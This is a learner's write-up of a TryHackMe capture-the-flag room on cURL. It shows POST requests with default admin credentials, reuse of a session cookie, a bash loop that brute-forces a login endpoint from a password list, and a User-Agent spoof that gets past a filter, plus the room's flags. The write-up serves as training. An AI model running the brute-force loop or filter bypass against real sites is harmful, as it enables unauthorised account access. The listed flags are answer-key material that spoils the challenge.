# Day 24 – Exploitation with cURL - Hoperation Eggsploit

## 🎯 Objectives

- Understand what HTTP requests and responses are at a high level.
- Use cURL to make basic requests (using GET) and view raw responses in the terminal.
- Send POST requests with cURL to submit data to endpoints.
- Work with cookies and sessions in cURL to maintain login state across requests.

---

## 🖥️ Environment

- **Platform:** TryHackMe  
- **Tools used:** Terminal
---

## 🔍 Approach

The challenge started off explaining what `curl` requests are for and how they're being used to create `https/http` responses.

First we make a post request with the below bash scripting to reveal the first flag.

```    
curl -X POST -d "username=admin&password=admin" http://10.49.155.137/post.php
```

We then need to amend the script to change to the `/cookie.php` endpoint and to save the cookie. We then made a new request with the second line of code including the cookie which provided the second flag.

```
#first line obtains the cookie

curl -c cookie.txt -d "username=admin&password=admin" http://10.49.155.137/cookie.php

#second line reused the cookie we've just obtained to make a new request.

curl -b cookie.txt http://10.49.155.137/cookie.php
```

For the next one we need to create a password list first which we do with `nano passwords.txt`. We add in the passwords and save the file. We then run the below script to brute force the end point which reveals the password: `secretpass`

```
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.49.155.137/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

For the last flag we need to make a request using the `TBFC` as an user-agent on the `/agent.php` endpoint. We use the below bash script which provides us with the final flag.

```
curl -A "TBFC" http://10.49.155.137/agent.php

```

---

## ⚠️ Challenges

- Understanding what `curl` requests are and what they're being used for.
- Creating the correct commands to retrieve the flags.

---

## 🚩 Flags

- THM{curl_post_success}
- THM{session_cookie_master}
- THM{user_agent_filter_bypassed}
  
---

## 📚 Lessons Learned

I learned what `curl` requests are and how they're being used by attackers to create `http/https` requests and how you can include this in your `Bash` scripts.

---

## 💭 Further Thoughts

I loved this room. I had heard about `curl` in the past but never realised what it did. It's great having the extra context behind it now and it was a solid last room to AOC 2025.
